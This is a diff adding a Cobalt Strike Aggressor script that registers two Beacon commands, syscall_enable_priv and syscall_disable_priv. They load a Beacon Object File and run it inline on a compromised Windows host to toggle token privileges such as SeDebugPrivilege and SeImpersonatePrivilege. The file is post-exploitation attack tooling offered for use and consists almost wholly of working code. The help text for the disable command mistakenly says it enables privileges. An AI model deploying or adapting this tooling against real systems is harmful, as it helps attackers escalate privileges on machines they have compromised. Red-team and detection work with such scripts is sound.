@@ -1,0 +1,105 @@
+global('$enableDisableHelpString');
+
+$enableDisableHelpString  = "\n";
+$enableDisableHelpString .= "Please select a number, to provide as an argument.\n";
+$enableDisableHelpString .= "E.g. syscall_[en|dis]able_priv 1\n\n";
+$enableDisableHelpString .= "1:\tSeCreateTokenPrivilege\n";
+$enableDisableHelpString .= "2:\tSeAssignPrimaryTokenPrivilege\n";
+$enableDisableHelpString .= "3:\tSeLockMemoryPrivilege\n";
+$enableDisableHelpString .= "4:\tSeIncreaseQuotaPrivilege\n";
+$enableDisableHelpString .= "5:\tSeUnsolicitedInputPrivilege\n";
+$enableDisableHelpString .= "6:\tSeMachineAccountPrivilege\n";
+$enableDisableHelpString .= "7:\tSeTcbPrivilege\n";
+$enableDisableHelpString .= "8:\tSeSecurityPrivilege\n";
+$enableDisableHelpString .= "9:\tSeTakeOwnershipPrivilege\n";
+$enableDisableHelpString .= "10:\tSeLoadDriverPrivilege\n";
+$enableDisableHelpString .= "11:\tSeSystemProfilePrivilege\n";
+$enableDisableHelpString .= "12:\tSeSystemtimePrivilege\n";
+$enableDisableHelpString .= "13:\tSeProfileSingleProcessPrivilege\n";
+$enableDisableHelpString .= "14:\tSeIncreaseBasePriorityPrivilege\n";
+$enableDisableHelpString .= "15:\tSeCreatePagefilePrivilege\n";
+$enableDisableHelpString .= "16:\tSeCreatePermanentPrivilege\n";
+$enableDisableHelpString .= "17:\tSeBackupPrivilege\n";
+$enableDisableHelpString .= "18:\tSeRestorePrivilege\n";
+$enableDisableHelpString .= "19:\tSeShutdownPrivilege\n";
+$enableDisableHelpString .= "20:\tSeDebugPrivilege\n";
+$enableDisableHelpString .= "21:\tSeAuditPrivilege\n";
+$enableDisableHelpString .= "22:\tSeSystemEnvironmentPrivilege\n";
+$enableDisableHelpString .= "23:\tSeChangeNotifyPrivilege\n";
+$enableDisableHelpString .= "24:\tSeRemoteShutdownPrivilege\n";
+$enableDisableHelpString .= "25:\tSeUndockPrivilege\n";
+$enableDisableHelpString .= "26:\tSeSyncAgentPrivilege\n";
+$enableDisableHelpString .= "27:\tSeEnableDelegationPrivilege\n";
+$enableDisableHelpString .= "28:\tSeManageVolumePrivilege\n";
+$enableDisableHelpString .= "29:\tSeImpersonatePrivilege\n";
+$enableDisableHelpString .= "30:\tSeCreateGlobalPrivilege\n";
+$enableDisableHelpString .= "31:\tSeTrustedCredManAccessPrivilege\n";
+$enableDisableHelpString .= "32:\tSeRelabelPrivilege\n";
+$enableDisableHelpString .= "33:\tSeIncreaseWorkingSetPrivilege\n";
+$enableDisableHelpString .= "34:\tSeTimeZonePrivilege\n";
+$enableDisableHelpString .= "35:\tSeCreateSymbolicLinkPrivilege\n";
+$enableDisableHelpString .= "36:\tSeDelegateSessionUserImpersonatePrivilege\n";
+
+
+beacon_command_register(
+    "syscall_enable_priv", 
+    "Use syscalls to enable user-defined privileges.", 
+    "Synopsis: syscall_enable_priv PRIV_NUMBER" . $enableDisableHelpString);
+
+
+beacon_command_register(
+    "syscall_disable_priv", 
+    "Use syscalls to enable user-defined privileges.", 
+    "Synopsis: syscall_disable_priv PRIV_NUMBER" . $enableDisableHelpString);
+
+
+alias syscall_enable_priv {
+    local('$handle $args $data');
+
+    if ( size(@_) != 2 ) {
+        blog($1, beacon_command_detail("syscall_enable_priv"));
+        return;
+    }
+
+    if ( (int($2) >= 1) && (int($2) <= 36) ) {
+        $handle = openf(script_resource("toggle_privileges_bof.x64.o"));
+        $data = readb($handle, -1);
+        closef($handle);
+
+        # Argument packing the privilege number
+        $args = bof_pack($1, "i", $2);
+
+        # Execution logic
+        beacon_inline_execute($1, $data, "enable", $args);
+    } else {
+        blog($1, beacon_command_detail("syscall_enable_priv"));
+        return;
+    }
+}
+
+
+alias syscall_disable_priv {
+    local('$handle $args $data');
+
+    if ( size(@_) != 2 ) {
+        blog($1, beacon_command_detail("syscall_disable_priv"));
+        return;
+    }
+
+    println(int($2));
+    if ( (int($2) >= 1) && (int($2) <= 36) ) {
+        $handle = openf(script_resource("toggle_privileges_bof.x64.o"));
+        $data = readb($handle, -1);
+        closef($handle);
+
+        # Argument packing the privilege number
+        $args = bof_pack($1, "i", $2);
+
+        # Execution logic
+        beacon_inline_execute($1, $data, "disable", $args);
+    } else {
+        blog($1, beacon_command_detail("syscall_disable_priv"));
+        return;
+    }
+
+}
